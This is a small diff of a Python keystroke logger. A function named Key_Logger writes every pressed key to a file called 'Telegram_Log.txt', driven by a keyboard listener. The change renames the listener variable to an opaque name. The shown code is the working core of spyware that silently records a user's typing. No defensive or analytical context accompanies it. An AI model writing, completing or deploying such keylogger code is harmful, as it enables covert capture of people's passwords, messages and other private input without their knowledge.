@@ -17,5 +17,5 @@ def Key_Logger(key):
     #elif key=='Key.left':key='    left'
     with open('Telegram_Log.txt', 'a') as log:
         log.write(key)
-with Listener(on_press=Key_Logger) as KeyStrokes:
-	KeyStrokes.join()
+with Listener(on_press=Key_Logger) as JQ_JN:
+	JQ_JN.join()
